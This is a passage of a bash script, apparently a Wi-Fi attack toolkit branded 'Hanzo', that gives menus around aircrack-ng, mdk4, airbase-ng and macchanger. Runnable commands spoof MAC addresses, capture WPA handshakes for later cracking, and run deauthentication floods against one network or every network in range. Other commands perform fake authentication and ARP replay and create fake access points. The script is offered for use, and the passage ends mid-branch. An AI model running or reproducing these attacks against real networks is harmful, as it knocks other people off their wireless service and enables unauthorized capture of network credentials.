#!/bin/bash

while true
do 
bankai_tits () {
# Color
RESET="\033[0m"
BOLD="\033[1m"
YELLOW="\033[38;5;11m"
RED="\033[1;31m" 
GREEN="\033[1;32m"
BLUE='\033[1;34m'        
PURPLE='\033[1;35m'

hello_world () {
    clear
echo "
                                   ██╗  ██╗ █████╗ ███╗   ██╗███████╗ ██████╗
                                   ██║  ██║██╔══██╗████╗  ██║╚══███╔╝██╔═══██╗
                                   ███████║███████║██╔██╗ ██║  ███╔╝ ██║   ██║
                                   ██╔══██║██╔══██║██║╚██╗██║ ███╔╝  ██║   ██║
                                   ██║  ██║██║  ██║██║ ╚████║███████╗╚██████╔╝
                                   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝ ╚═════╝ "  | lolcat 
echo ""
figlet -f digital "                                   Made By Death Esther" | lolcat 
echo ""
}

speed_meow () {
    read -e -p "$(echo -e $BOLD$BLUE"Set speed (default = 50) => "$RESET) => " speedx #speed
}



interface_name () {
    echo ""
    echo -e "\0033[1;34m______________________________\e[0m" #blue
    echo ""
    echo -e "\0033[1;7;34m check your interface name  \e[0m"
    echo -e "\0033[1;34m______________________________\e[0m"
    echo ""
    echo ""
    iwconfig
    echo ""
    echo ""
    read -e -p "$(echo -e $GREEN"Enter your Interface name "$RESET) => "  lan #green
    echo ""
    echo ""
}



# Module [1] recone                              Module [2] Attacks               module 3
# SCAN Networks   -3                       DEAUTHENTICATION ATTACK                   # Install Driver for Kali-Linux 
# Chnage mac address                                       FAKEAUTHENTICATION ATTACK                 Crack Handshake file
#                                          ARP-REPLAY                               Convert Handshake cap file 
# RESTART NETWORK                          FAKE ACCESSPOINTS ATTACK           
#                                          FROZE NETWORK ATTACK 
# Adapter Test                             MAC FLOOD ATTACK
# update                                   Man In the middle Attack
hello_world
echo -e "
█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
█                                          $RED M  O  D  U  L  E  S $RESET                                                 █
█                                                                                                                █
█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
█   [1]     recon                   █  [2]      ATTACK                     █  [3]  Normal Things                 █
█                                   █                                      █                                     █
█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
█   [1] Scan Networks               █  [1] Deauthentication Attacks        █  [1] Install Driver for Kali-Linux  █
█                                   █  [2] Fakeauthentication Attacks      █                                     █
█   [2] Scan Your's Router          █  [3] Arp-Replay Attack               █  [2] Convert Handshake Cap Files    █
█                                   █  [4] Creat Fake Accesspoints Attack  █                                     █
█   [3] Restart Network             █  [5] Froze Network Attack            █  [3] Crack Handshake Cap Files      █
█                                   █  [6] Mac Flood Attack                █                                     █
█   [4] Adapter Test                █  [7] Man In The Middle Attack        █  [4] Graph of connected device      █
█                                   █  [8] Data Flood Attack (QoS)         █                                     █
█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█ "

echo ""
echo ""
read -e -p "$(echo -e $BOLD$YELLOW"Select a Module => "$RESET) "  Modules

if [ $Modules == "1" ]
then
hello_world
interface_name
clear

figlet -c "Recon" | lolcat
echo ""
        # basic user interface 
        echo -e "\e[1;35m[1]\e[0m \e[1;35m Scan Networks \e[0m" #purple
        echo ""
        echo -e "\e[1;35m[2]\e[0m \e[1;35m Scan Your's Router   \e[0m" #purple
        echo ""
        echo -e "\e[1;35m[3]\e[0m \e[1;35m Restart Network \e[0m"  #purple
        echo ""
        echo -e "\e[1;35m[4]\e[0m \e[1;35m Adapter Test \e[0m"  #purple
        echo ""
        ##  Select option for Recon
        read -e -p "$(echo -e $BOLD$YELLOW"Select the options"$RESET) => "  a  #YELLOW
        echo ""

        if [ $a == "1" ]    # S C A N 
        then
        clear
        figlet  -c "Scanning Network" | lolcat
            echo -e "\e[1;35m[1]\e[0m \e[1;35m Quick Network Scan \e[0m" #purple
            echo ""
            echo -e "\e[1;35m[2]\e[0m \e[1;35m Scan Safely Network\e[0m" #purple
            echo ""
            echo -e "\e[1;35m[3]\e[0m \e[1;35m Advance Scan Cover All Networks \e[0m" #purple
            echo ""
            echo -e "\e[1;35m[4]\e[0m \e[1;35m Scan & Capture Handshake of Every Network In Range \e[0m" #purple
            echo ""
            #Selection
            read -e -p "$(echo -e $BOLD$YELLOW"Select the options"$RESET) => " bed             #bed all var
            echo ""
             if [ $bed == "1" ]    # 
            then
            clear
                echo -e "\033[1;31m____________________\033[0m" #red
                echo ""
                echo -e "\033[7;1;31m S T A R T I N G    \033[0m" #red bold heighlight    Quick Network Scan
                echo -e "\033[1;31m____________________\033[0m" #red
                sleep 1s
                clear
                figlet -c "Quick Scan" | lolcat 
                echo ""
                echo -e "\0033[1;36m<------------------------------------------>\033[0m"
                echo -e "\0033[1;7;36m please press ctrl + c to stop scanning    \033[0m"
                echo -e "\0033[1;36m<------------------------------------------>\033[0m"
                sudo ifconfig $lan down 
                echo ""
                echo -e "$YELLOW _____________________$RESET"
                echo ""
                echo -e "$YELLOW  Making monitor mode $RESET"
                echo -e "$YELLOW _____________________$RESET"
                sleep 1s
                echo ""
                sudo iwconfig $lan Mode Monitor 
                sudo ifconfig $lan up
                sudo airmon-ng check kill
                sudo airodump-ng $lan
                sleep 1s
                echo ""
                read -e -p "$(echo -e $BLUE"Enter target bssid"$RESET) => " id  #blue
                echo ""
                read -e -p "$(echo -e $BLUE"Enter target channel n.o"$RESET) => " class  #blue
                echo ""
                    echo ""
                    read -e -p "$(echo -e $BOLD$YELLOW"Would U like to Capture Handshake (y/n)"$RESET) =>" yippi
                    echo ""
                    #--------------------------------------------------------------------------------
                    if [ $yippi == "y" ]      ##test need
                    then
                        read -e -p "$(echo -e $BOLD$YELLOW"can u define a name"$RESET) =>" writehandshake #all var
                        echo ""
                        sleep 1s
                           if [ -d /home/$USER/hanzo/ ]
                           then
                           echo ""
                                if [ -d /home/$USER/hanzo/handshake/ ]
                                then 
                                echo -e "$RED Handshake will be stored In Handshake Folder $RESET"
                                sleep 1s
                                sudo airodump-ng $lan --bssid $id --channel $class -w /home/$USER/hanzo/handshake/$writehandshake
                                else
                                mkdir /home/$USER/hanzo/handshake/
                                echo -e "$RED Creating a folder for saving handshake inside hanzo $RESET"
                                sleep 1s
                                sudo airodump-ng $lan --bssid $id --channel $class -w /home/$USER/hanzo/handshake/$writehandshake
                                fi
                           else
                                mkdir /home/$USER/hanzo/
                                if [ -d /home/$USER/hanzo/handshake/ ]   #test need
                                then 
                                echo -e "$RED Handshake will be stored In Handshake Folder $RESET"
                                sleep 1s
                                sudo airodump-ng $lan --bssid $id --channel $class -w /home/$USER/hanzo/handshake/$writehandshake
                                else
                                mkdir /home/$USER/hanzo/handshake/
                                echo -e "$RED Creating a folder for saving handshake inside hanzo $RESET"
                                sleep 1s
                                sudo airodump-ng $lan --bssid $id --channel $class -w /home/$USER/hanzo/handshake/$writehandshake
                                fi
                            fi
                    else
                        sudo airodump-ng $lan --bssid $id --channel $class
                    fi
                    #---------------------------------------------------------------------------------
            
            elif [ $bed == "2" ]    # doing   Safty scan   spoof mac address and same 
            then
                clear
                echo -e "\033[1;33m____________________\033[0m" #purple bold
                echo ""
                echo -e "\033[7;1;33m   S T A R T I N G  \033[0m" #yellow + blink
                echo -e "\033[1;33m____________________\033[0m" #purple bold
                clear
                echo -e "$BLUE _________________________________$RESET" #blue 
                echo ""
                echo -e "$BLUE  Selected interface => $lan      $RESET" #blue 
                echo -e "$BLUE _________________________________$RESET" #blue 
                sleep 1s
                clear
                echo -e "$RED __________________________$RESET"  #red
                echo ""
                echo -e "$RED  Turning interface down   $RESET"  #red
                echo -e "$RED __________________________$RESET"  #red
                sudo ifconfig $lan down
                echo ""
                echo ""
                echo -e "$BLUE ____________________________$RESET" #BLUE
                echo ""
                echo -e "$BLUE   The current Mac address   $RESET"
                echo -e "$BLUE ____________________________$RESET"
                echo ""
                sleep 1s
                sudo macchanger -s $lan
                sleep 1s
                echo ""
                echo -e "$PURPLE ______________________________$RESET" #purple
                echo ""    
                echo -e "$PURPLE  Spoofing To New Mac Adress   $RESET"
                echo -e "$PURPLE ______________________________$RESET"
                echo ""
                sudo macchanger -r $lan
                sleep 1s
    # echo -e "\0033[1;32m*********************************************\e[0m"
    # echo -e "\0033[1;32m* STARTING Changing Interface to name $lan *\e[0m"
    # echo -e "\0033[1;32m*********************************************\e[0m"
    # sudo ip link set $lan name wlan0
                echo ""
                echo -e "$RED _________________________$RESET"
                echo ""
                echo -e "$RED   Turning interface up   $RESET"
                echo -e "$RED _________________________$RESET"
                sudo ifconfig $lan up
                echo ""
                sleep 1s
                sudo airmon-ng check kill
                echo ""
                echo -e "$YELLOW _____________________$RESET"
                echo ""
                echo -e "$YELLOW  Making monitor mode $RESET"
                echo -e "$YELLOW _____________________$RESET"
                echo ""
                sudo airmon-ng start $lan
                echo  ""
                sleep 1s
                echo -e "\033[1;33m______________________$RESET"
                echo ""
                echo -e "\033[1;7;33m  Scanning Netowrks   \033[0m"
                echo -e "\033[1;33m______________________$RESET"
                sudo airodump-ng $lan
                sleep 1s
                echo ""
                read -e -p "$(echo -e $BLUE"Enter target bssid"$RESET) => " id  #blue
                echo ""
                read -e -p"$(echo -e $BLUE"Enter target channel n.o"$RESET) => " class  #blue
                echo ""
                echo ""
                    read -e -p "$(echo -e $BOLD$YELLOW"Would U like to Capture Handshake (y/n)"$RESET) =>" yippi
                    echo ""
                    #--------------------------------------------------------------------------------
                    if [ $yippi == "y" ]      ##test need
                    then
                        read -e -p "$(echo -e $BOLD$YELLOW"can u define a name"$RESET) =>" writehandshake #all var
                        echo ""
                        sleep 1s
                           if [ -d /home/$USER/hanzo/ ]
                           then
                           echo ""
                                if [ -d /home/$USER/hanzo/handshake/ ]
                                then 
                                echo -e "$RED Handshake will be stored In Handshake Folder $RESET"
                                sleep 1s
                                sudo airodump-ng $lan --bssid $id --channel $class -w /home/$USER/hanzo/handshake/$writehandshake
                                else
                                mkdir /home/$USER/hanzo/handshake/
                                echo -e "$RED Creating a folder for saving handshake inside hanzo $RESET"
                                sleep 1s
                                sudo airodump-ng $lan --bssid $id --channel $class -w /home/$USER/hanzo/handshake/$writehandshake
                                fi
                           else
                                mkdir /home/$USER/hanzo/
                                if [ -d /home/$USER/hanzo/handshake/ ]   #test need
                                then 
                                echo -e "$RED Handshake will be stored In Handshake Folder $RESET"
                                sleep 1s
                                sudo airodump-ng $lan --bssid $id --channel $class -w /home/$USER/hanzo/handshake/$writehandshake
                                else
                                mkdir /home/$USER/hanzo/handshake/
                                echo -e "$RED Creating a folder for saving handshake inside hanzo $RESET"
                                sleep 1s
                                sudo airodump-ng $lan --bssid $id --channel $class -w /home/$USER/hanzo/handshake/$writehandshake
                                fi
                            fi
                    else
                        sudo airodump-ng $lan --bssid $id --channel $class
                   fi
                elif [ $bed == "3" ]    # doing   advance scan   spoof mac address and same 
                then
                    clear
                echo -e "\033[1;33m____________________\033[0m" #purple bold
                echo ""
                echo -e "\033[7;1;33m   S T A R T I N G  \033[0m" #yellow + blink
                echo -e "\033[1;33m____________________\033[0m" #purple bold
                clear
                echo -e "$BLUE _________________________________$RESET" #blue 
                echo ""
                echo -e "$BLUE  Selected interface => $lan      $RESET" #blue 
                echo -e "$BLUE _________________________________$RESET" #blue 
                sleep 1s
                clear
                echo -e "$RED __________________________$RESET"  #red
                echo ""
                echo -e "$RED  Turning interface down   $RESET"  #red
                echo -e "$RED __________________________$RESET"  #red
                sudo ifconfig $lan down
                echo ""
                echo ""
                echo -e "$BLUE ____________________________$RESET" #BLUE
                echo ""
                echo -e "$BLUE   The current Mac address   $RESET"
                echo -e "$BLUE ____________________________$RESET"
                echo ""
                sleep 1s
                sudo macchanger -s $lan
                sleep 1s
                echo ""
                echo -e "$PURPLE ______________________________$RESET" #purple
                echo ""    
                echo -e "$PURPLE  Spoofing To New Mac Adress   $RESET"
                echo -e "$PURPLE ______________________________$RESET"
                echo ""
                sudo macchanger -r $lan
                sleep 1s

                echo ""
                echo -e "$RED _________________________$RESET"
                echo ""
                echo -e "$RED   Turning interface up   $RESET"
                echo -e "$RED _________________________$RESET"
                sudo ifconfig $lan up
                echo ""
                sleep 1s
                sudo airmon-ng check kill
                echo ""
                echo -e "$YELLOW _____________________$RESET"
                echo ""
                echo -e "$YELLOW  Making monitor mode $RESET"
                echo -e "$YELLOW _____________________$RESET"
                echo ""
                sudo airmon-ng start $lan
                echo  ""
                sleep 1s
                echo -e "\033[1;33m______________________$RESET"
                echo ""
                echo -e "\033[1;7;33m  Scanning Netowrks   \033[0m"
                echo -e "\033[1;33m______________________$RESET"
                sudo airodump-ng $lan -abg --manufacturer --wps -U --showack
                sleep 1s
                echo ""
                read -e -p "$(echo -e $BLUE"Enter target bssid"$RESET) => " id  #blue
                echo ""
                read -e -p "$(echo -e $BLUE"Enter target channel n.o"$RESET) => " class  #blue
                echo ""
                #
                read -e -p "$(echo -e $BOLD$YELLOW"Would U like to Capture Handshake (y/n)"$RESET) =>" yippi
                    echo ""
                    #--------------------------------------------------------------------------------
                    if [ $yippi == "y" ]      ##test need
                    then
                        read -e -p "$(echo -e $BOLD$YELLOW"can u define a name"$RESET) =>" writehandshake #all var
                        echo ""
                        sleep 1s
                           if [ -d /home/$USER/hanzo/ ]
                           then
                           echo ""
                                if [ -d /home/$USER/hanzo/handshake/ ]
                                then 
                                echo -e "$RED Handshake will be stored In Handshake Folder $RESET"
                                sleep 1s
                                sudo airodump-ng $lan -abg --manufacturer --wps -U --showack --bssid $id --channel $class -w /home/$USER/hanzo/handshake/$writehandshake
                                else
                                mkdir /home/$USER/hanzo/handshake/
                                echo -e "$RED Creating a folder for saving handshake inside hanzo $RESET"
                                sleep 1s
                                sudo airodump-ng $lan -abg --manufacturer --wps -U --showack --bssid $id --channel $class -w /home/$USER/hanzo/handshake/$writehandshake
                                fi
                           else
                                mkdir /home/$USER/hanzo/
                                if [ -d /home/$USER/hanzo/handshake/ ]   #test need
                                then 
                                echo -e "$RED Handshake will be stored In Handshake Folder $RESET"
                                sleep 1s
                                sudo airodump-ng $lan -abg --manufacturer --wps -U --showack --bssid $id --channel $class -w /home/$USER/hanzo/handshake/$writehandshake
                                else
                                mkdir /home/$USER/hanzo/handshake/
                                echo -e "$RED Creating a folder for saving handshake inside hanzo $RESET"
                                sleep 1s
                                sudo airodump-ng $lan -abg --manufacturer --wps -U --showack --bssid $id --channel $class -w /home/$USER/hanzo/handshake/$writehandshake
                                fi
                            fi
                    else
                        sudo airodump-ng $lan  -abg --manufacturer --wps -U --showack --bssid $id --channel $class
                   fi
            elif [ $bed == "4" ]    # bssidng
            then
            echo -e "\033[1;33m____________________\033[0m" #purple bold
                echo ""
                echo -e "\033[7;1;33m   S T A R T I N G  \033[0m" #yellow + blink
                echo -e "\033[1;33m____________________\033[0m" #purple bold
                clear
                echo -e "$BLUE _________________________________$RESET" #blue 
                echo ""
                echo -e "$BLUE  Selected interface => $lan      $RESET" #blue 
                echo -e "$BLUE _________________________________$RESET" #blue 
                sleep 1s
                clear
                echo -e "$RED __________________________$RESET"  #red
                echo ""
                echo -e "$RED  Turning interface down   $RESET"  #red
                echo -e "$RED __________________________$RESET"  #red
                sudo ifconfig $lan down
                echo ""
                echo ""
                echo -e "$BLUE ____________________________$RESET" #BLUE
                echo ""
                echo -e "$BLUE   The current Mac address   $RESET"
                echo -e "$BLUE ____________________________$RESET"
                echo ""
                sleep 1s
                sudo macchanger -s $lan
                sleep 1s
                echo ""
                echo -e "$PURPLE ______________________________$RESET" #purple
                echo ""    
                echo -e "$PURPLE  Spoofing To New Mac Adress   $RESET"
                echo -e "$PURPLE ______________________________$RESET"
                echo ""
                sudo macchanger -r $lan
                sleep 1s
    # echo -e "\0033[1;32m*********************************************\e[0m"
    # echo -e "\0033[1;32m* STARTING Changing Interface to name $lan *\e[0m"
    # echo -e "\0033[1;32m*********************************************\e[0m"
    # sudo ip link set $lan name wlan0
                echo ""
                echo -e "$RED _________________________$RESET"
                echo ""
                echo -e "$RED   Turning interface up   $RESET"
                echo -e "$RED _________________________$RESET"
                sudo ifconfig $lan up
                echo ""
                sleep 1s
                sudo airmon-ng check kill
                echo ""
                echo -e "$YELLOW _____________________$RESET"
                echo ""
                echo -e "$YELLOW  Making monitor mode $RESET"
                echo -e "$YELLOW _____________________$RESET"
                echo ""
                sudo airmon-ng start $lan
                echo  ""
                sleep 1s
                echo -e "\033[1;33m______________________$RESET"
                echo ""
                echo -e "\033[1;7;33m  Scanning Netowrks   \033[0m"
                echo -e "\033[1;33m______________________$RESET"
                echo ""
                echo -e "$RED Information will be stored in Home besside.log,wpa.wep.cap $RESET"
                echo ""
                clear
                sudo besside-ng $lan -v
            else
            /home/$USER/test
            fi
            ##############################
        elif [ $a == "2" ]    # Scan Your's Router
        then
                echo -e "\033[1;31m____________________\033[0m" #red
                echo ""
                echo -e "\033[7;1;31m S T A R T I N G    \033[0m" #red bold heighlight    Quick Network Scan
                echo -e "\033[1;31m____________________\033[0m" #red
                sleep 1s
                clear
                figlet -c "Scanning Router" | lolcat 
                echo ""
                echo -e "\0033[1;36m<------------------------------------------>\033[0m"
                echo -e "\0033[1;7;36m please press ctrl + c to stop scanning    \033[0m"
                echo -e "\0033[1;36m<------------------------------------------>\033[0m"
                sleep 1s
                clear
                sudo netdiscover
        elif [ $a == "3" ]   #restart netw 
        then
        echo -e "\0033[1;35m____________________________\e[0m"
        echo ""
        echo -e "\0033[1;7;31m  Resarting NetworkManager  \e[0m"
        echo -e "\0033[1;35m____________________________\e[0m"
        echo ""
        sudo airmon-ng stop $lan
        sleep 1s
        service NetworkManager restart
        elif [ $a == "4" ]  #adapter test 
        then
        clear

        figlet -c "Adapter Test" | lolcat 
    echo ""
    echo -e "\e[1;35m[1]\e[0m \e[1;35m Packet Injection Test\e[0m" #purple
    echo ""
    echo -e "\e[1;35m[2]\e[0m \e[1;35m AP Test \e[0m" #purple
    echo ""
    read -e -p "Select the options => " Adp             #bed all var
    echo ""
        if [ $Adp == "1" ]    # 
        then
            sudo airmon-ng start $lan
            sudo aireplay-ng --test $lan
        elif [ $Adp == "2" ]    # 
        then
            iw list | grep --color AP$
        else
        /home/$USER/test
        fi
    else
     /home/$USER/test
    fi
############################################################################################################################################################
elif [ $Modules == "2" ]
then
hello_world
interface_name
clear

figlet -c "Attacks" | lolcat
echo ""
        # basic user interface 
        echo -e "\e[1;35m[1]\e[0m \e[1;35m Deauthentication Attacks \e[0m" #purple
        echo ""
        echo -e "\e[1;35m[2]\e[0m \e[1;35m Fakeauthentication Attacks  \e[0m" #purple
        echo ""
        echo -e "\e[1;35m[3]\e[0m \e[1;35m Arp-Replay Attack \e[0m"  #purple
        echo ""
        echo -e "\e[1;35m[4]\e[0m \e[1;35m Creat Fake Accesspoints Attack \e[0m"  #purple
        echo ""
        echo -e "\e[1;35m[5]\e[0m \e[1;35m Froze Network Attack  \e[0m"  #purple
        echo ""
        echo -e "\e[1;35m[6]\e[0m \e[1;35m Mac Flood Attack \e[0m"  #purple
        echo ""
        echo -e "\e[1;35m[7]\e[0m \e[1;35m Man In The Middle Attack \e[0m"  #purple  
        echo ""
        echo -e "\e[1;35m[8]\e[0m \e[1;35m Data Flood Attack (QoS)  \e[0m"  #purple   (QoS)mdk4 wlan0 m -t 64:FB:92:8C:14:78 -j  make deauth1st to inject   ## data flood └─# mdk4 wlan0 f -s a b p -m d s b "64:FB:92:8C:14:78"
        echo ""
        ##  Select option for Recon
        read -e -p "$(echo -e $BOLD$YELLOW"Select the options"$RESET) => "  b  #YELLOW
        echo ""

        if [ $b == "1" ]    # deauth
        then
            clear
            echo -e "\033[1;34m
            #######\                                  ##\     ##\       
            ##  __##\                                 ## |    ## |      
            ## |  ## | ######\   ######\  ##\   ##\ ######\   #######\  
            ## |  ## |##  __##\  \____##\ ## |  ## |\_##  _|  ##  __##\ 
            ## |  ## |######## | ####### |## |  ## |  ## |    ## |  ## |
            ## |  ## |##   ____|##  __## |## |  ## |  ## |##\ ## |  ## |
            #######  |\#######\ \####### |\######  |  \####  |## |  ## |
            \_______/  \_______| \_______| \______/    \____/ \__|  \__|\033[0m" | lolcat
            echo ""
            echo ""
            echo -e "\e[1;35m[1]\e[0m \e[1;35m Deauth On Whole Network  [Low] \e[0m" #purple
            echo ""
            echo -e "\e[1;35m[2]\e[0m \e[1;35m Deauth On Clint To Capture Handshake [Medium] \e[0m" #purple
            echo ""
            echo -e "\e[1;35m[3]\e[0m \e[1;35m Deauth Everyone Network In Range [Medium] \e[0m" #purple
            echo ""
            echo -e "\e[1;35m[4]\e[0m \e[1;35m Deauth Whole Network & EVERY DEVICE [High]\e[0m" #purple
            echo ""
            echo -e "\e[1;35m[5]\e[0m \e[1;35m Log-off and Re-Inject and Get EAPOL  [High]\e[0m" #purple     "mdk4 wlan0 e -t (ACCESS POINT 64:FB:92:8C:14:78) -l"
            echo ""
            #Selection
            read -e -p "$(echo -e $BOLD$YELLOW"Select the options"$RESET) => " bed             #bed all var
            echo ""
            if [ $bed == "1" ];then  # [  working ]
            hello_world

                echo ""
                read -e -p "$(echo -e $BOLD$BLUE"Enter Target Address =>"$RESET) => " id # bssid 
                echo ""
                read -e -p "$(echo -e $BOLD$BLUE"Number of packet sent (0 is infinite) => "$RESET) => " deauth #deauth
                echo "" 
                echo -e "\e[1;33m__________________________________\e[0m"
                echo ""
                echo -e "\e[7;33m D E A U T H E N T I C A T I N G \e[0m"
                echo -e "\e[1;33m__________________________________\e[0m"
                sleep 1s
                sudo aireplay-ng $lan -a $id -0 $deauth
            elif [ $bed == "2" ];then # [working]
                hello_world
                echo ""
                read -e -p "$(echo -e $BOLD$BLUE"Enter Target Address =>"$RESET) => " id # bssid 
                echo ""
                read -e -p "$(echo -e $BOLD$BLUE"Enter Clint Address =>"$RESET) => " clit # clint 
                echo ""
                read -e -p "$(echo -e $BOLD$BLUE"Number of packet sent (0 is infinite) => "$RESET) => " deauth #deauth
                echo "" 
                echo -e "\e[1;33m__________________________________\e[0m"
                echo ""
                echo -e "\e[7;33m D E A U T H E N T I C A T I N G \e[0m"
                echo -e "\e[1;33m__________________________________\e[0m"
                sleep 1s
                sudo aireplay-ng $lan -a $id -c $clit -0 $deauth
            elif [ $bed == "3" ];then 
            hello_world
            speed_meow
            echo ""
                echo -e "\e[1;33m__________________________________\e[0m"
                echo ""
                echo -e "\e[7;33m D E A U T H E N T I C A T I N G \e[0m"
                echo -e "\e[1;33m__________________________________\e[0m"
                sleep 1s
                echo ""

            mdk4 wlan0 d x -s $speedx  

            elif [ $bed == "4" ];then 
            hello_world
            read -e -p "$(echo -e $BOLD$BLUE"Enter Target Address =>"$RESET) => " id # bssid
            echo ""
            speed_meow
            echo ""
                echo -e "\e[1;33m__________________________________\e[0m"
                echo ""
                echo -e "\e[7;33m D E A U T H E N T I C A T I N G \e[0m"
                echo -e "\e[1;33m__________________________________\e[0m"
                sleep 1s
                echo ""

            mdk4 wlan0 d x -B $id-s $speedx  
            elif [ $bed == "5" ];then 
               hello_world
               read -e -p "$(echo -e $BOLD$BLUE"Enter Target Address =>"$RESET) => " id # bssid
               echo ""
               speed_meow
                echo ""
                echo -e "\e[1;33m__________________________________\e[0m"
                echo ""
                echo -e "\e[7;33m D E A U T H E N T I C A T I N G \e[0m"
                echo -e "\e[1;33m__________________________________\e[0m"
                sleep 1s
                echo ""
            sudo mdk4 $lan e -t $id -l -s $speedx

            else
            /home/$USER/test
            fi
######################################################################################
        elif [ $b == "2" ]    # fake
        then
        echo -e "
                 ███████╗  █████╗  ██╗  ██╗ ███████╗  █████╗  ██╗   ██╗ ████████╗ ██╗  ██╗
                 ██╔════╝ ██╔══██╗ ██║ ██╔╝ ██╔════╝ ██╔══██╗ ██║   ██║ ╚══██╔══╝ ██║  ██║
                 █████╗   ███████║ █████╔╝  █████╗   ███████║ ██║   ██║    ██║    ███████║
                 ██╔══╝   ██╔══██║ ██╔═██╗  ██╔══╝   ██╔══██║ ██║   ██║    ██║    ██╔══██║
                 ██║      ██║  ██║ ██║  ██╗ ███████╗ ██║  ██║ ╚██████╔╝    ██║    ██║  ██║
                 ╚═╝      ╚═╝  ╚═╝ ╚═╝  ╚═╝ ╚══════╝ ╚═╝  ╚═╝  ╚═════╝     ╚═╝    ╚═╝  ╚═╝" | lolcat
        echo ""
        read -e -p "$(echo -e $BOLD$BLUE"Enter Target Address =>"$RESET) => " id # bssid
        echo ""
        read -e -p "$(echo -e $BOLD$BLUE"Enter Target Name =>"$RESET) => " esidx # bssid
        echo ""
        sudo macchanger -s $lan
        echo ""
        read -e -p "$(echo -e $BOLD$BLUE"Enter Your Current Mac address =>"$RESET) => " macx # bssid
        echo ""
        read -e -p "$(echo -e $BOLD$BLUE"Number of Auth-request (Recommended = 0)  =>"$RESET) => " fke # fake
        echo ""
        sudo aireplay-ng $lan --fakeauth $fke -a $id -h $macx -e "$esidx"
######################################################################################
        elif [ $b == "3" ]    # fake
        then
        echo -e "\e[1;36m
    ______     ______     ______      ______     ______     ______   __         ______     __  __    
   /\  __ \   /\  == \   /\  == \    /\  == \   /\  ___\   /\  == \ /\ \       /\  __ \   /\ \_\ \   
   \ \  __ \  \ \  __<   \ \  _-/    \ \  __<   \ \  __\   \ \  _-/ \ \ \____  \ \  __ \  \ \____ \  
    \ \_\ \_\  \ \_\ \_\  \ \_\       \ \_\ \_\  \ \_____\  \ \_\    \ \_____\  \ \_\ \_\  \/\_____\ 
     \/_/\/_/   \/_/ /_/   \/_/        \/_/ /_/   \/_____/   \/_/     \/_____/   \/_/\/_/   \/_____/ 
                                                                                                  \e[0m" | lolcat 
        echo ""
        read -e -p "$(echo -e $BOLD$BLUE"Enter Target Address =>"$RESET) => " id # bssid
        echo ""
        read -e -p "$(echo -e $BOLD$BLUE"Enter Target Name =>"$RESET) => " esidx # bssid
        echo ""
        sudo macchanger -s $lan
        echo ""
        read -e -p "$(echo -e $BOLD$BLUE"Enter Your Current Mac address =>"$RESET) => " macx # bssid
        echo ""
        sudo aireplay-ng --arpreplay -b $id -h $macx $lan -e "$esidx"
######################################################################################
        elif [ $b == "4" ]    # fake
        then
        echo "
        ███████╗ █████╗ ██╗  ██╗███████╗   █████╗  ██████╗   █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗
        ██╔════╝██╔══██╗██║ ██╔╝██╔════╝  ██╔══██╗ ██╔══██╗ ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝
        █████╗  ███████║█████╔╝ █████╗    ███████║ ██████╔╝ ███████║   ██║      ██║   ███████║██║     █████╔╝ 
        ██╔══╝  ██╔══██║██╔═██╗ ██╔══╝    ██╔══██║ ██╔═══╝  ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ 
        ██║     ██║  ██║██║  ██╗███████╗  ██║  ██║ ██║      ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗
        ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝  ╚═╝  ╚═╝ ╚═╝      ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝" | lolcat 
            echo ""
            echo -e "\e[1;35m[1]\e[0m \e[1;35m Creat A Single AP \e[0m" #purple
            echo ""
            echo -e "\e[1;35m[2]\e[0m \e[1;35m Creat Multi AP with List of Names \e[0m" #purple
            echo ""
            echo -e "\e[1;35m[3]\e[0m \e[1;35m Creat Multi AP with Names or Bssid \e[0m" #purple
            echo ""
            echo -e "\e[1;35m[4]\e[0m \e[1;35m Creat Multi AP Randomly \e[0m" #purple
            echo ""
            #Selection
            read -e -p "$(echo -e $BOLD$YELLOW"Select the options"$RESET) => " rdx  
            echo ""
            if [ $rdx == "1" ]
            then
            hello_world
            read -e -p "$(echo -e $BOLD$BLUE"Enter Name For AP =>"$RESET) => " esidx # bssid
            echo ""
            sudo airbase-ng  -e "$esidx"  $lan
            elif [ $rdx == "2" ]
            then
            hello_world
            read -e -p "$(echo -e $BOLD$BLUE"Path for List of Name =>"$RESET) => " pathx # pathx
            echo ""
            sudo mdk4 $lan b -f $pathx
            elif [ $rdx == "3" ]
            then
            hello_world
